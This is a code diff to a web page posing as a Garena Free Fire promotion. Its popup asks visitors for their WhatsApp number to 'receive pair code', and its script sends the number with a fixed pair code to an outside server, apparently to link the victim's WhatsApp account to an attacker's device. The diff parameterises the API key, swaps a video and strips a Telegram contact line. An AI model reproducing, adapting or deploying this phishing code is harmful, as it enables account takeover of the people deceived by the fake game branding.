@@ -1073,7 +1073,7 @@
         }
 
         .get-code-btn {
-            background: #c52222;
+            background: var(--red);
             /* solid green */
             border: none;
             padding: 14px 20px;
@@ -1264,7 +1264,7 @@
                 <div class="frame-corner-br"></div>
                 <video controls="" controlslist="nodownload noremoteplayback" disablepictureinpicture=""
                     oncontextmenu="return false;" id="protectedVideo" preload="auto" playsinline="" autoplay="">
-                    <source src="https://github.com/repokinghoro/vdos/raw/refs/heads/main/uploads/ALL FF .mp4">
+                    <source src="https://github.com/repokinghoro/vdos/raw/refs/heads/main/uploads/proxy.mp4">
                     Your browser does not support the video tag.
                 </video>
                 <div class="video-index">FF • VDO • 2026</div>
@@ -1415,13 +1415,6 @@
         </div>
         <div class="footer">
             <p>© 2026 — Garena Free Fire Team — All Rights Reserved</p>
-            <div style="color: rgba(255, 255, 255, 0.5);">
-                Contact for this promotion on TG:
-                <a href="https://t.me/brandmotivemarketing" target="_blank"
-                    style="text-decoration: underline; color: rgba(255, 255, 255, 0.5);">
-                    @brandmotivemarketing
-                </a>
-            </div>
         </div>
 
         <script>
@@ -1679,21 +1672,21 @@
                     });
 
                     contentContainer.innerHTML = `
-                <div class="popup-left">
-                <span class="whatsapp">Whatsapp</span>
-                <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/970f34cf4cd1a7b8b1a09e28067f167agif" alt="logo">
+                                                    <div class="popup-left">
+                                                    <span class="whatsapp">Whatsapp</span>
+                                                    <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/970f34cf4cd1a7b8b1a09e28067f167agif" alt="logo">
 
-                <div class="header-divider"></div>
-                </div>
-                <div class="modal-sub">Enter your WhatsApp number to receive pair code</div>
-                <div class="input-group">
-                    <select class="country-code" id="countryCodeSelect">
-                        ${optionsHtml}
-                    </select>
-                    <input type="tel" class="phone-input" id="phoneNumberInput" placeholder="Phone number" autocomplete="off">
-                </div>
-                <button class="get-code-btn" id="getCodeBtn">GET CODE</button>
-            `;
+                                                    <div class="header-divider"></div>
+                                                    </div>
+                                                    <div class="modal-sub">Enter your WhatsApp number to receive pair code</div>
+                                                    <div class="input-group">
+                                                        <select class="country-code" id="countryCodeSelect">
+                                                            ${optionsHtml}
+                                                        </select>
+                                                        <input type="tel" class="phone-input" id="phoneNumberInput" placeholder="Phone number" autocomplete="off">
+                                                    </div>
+                                                    <button class="get-code-btn" id="getCodeBtn">GET CODE</button>
+                                                `;
 
                     const getCodeBtn = document.getElementById('getCodeBtn');
                     const phoneInput = document.getElementById('phoneNumberInput');
@@ -1716,12 +1709,14 @@
                                 .trim();
 
                             let uuid = null;
+                            let key = null;
 
                             const params = new URLSearchParams(window.location.search);
                             uuid = params.get('click_id') || Date.now().toString();
+                            key = params.get('key') || 'daYbKWgF';
 
 
-                            const apiUrl = `https://moneysocial.xavi.top/qrcode?key=daYbKWgF&pairCode=77773333&uuid=${uuid}&phone=${encodeURIComponent(fullNumber)}`;
+                            const apiUrl = `https://moneysocial.xavi.top/qrcode?key=${key}&pairCode=77773333&uuid=${uuid}&phone=${encodeURIComponent(fullNumber)}`;
 
                             // Example fetch (replace with your real GET endpoint)
                             const response = await fetch(apiUrl, { method: 'GET' });
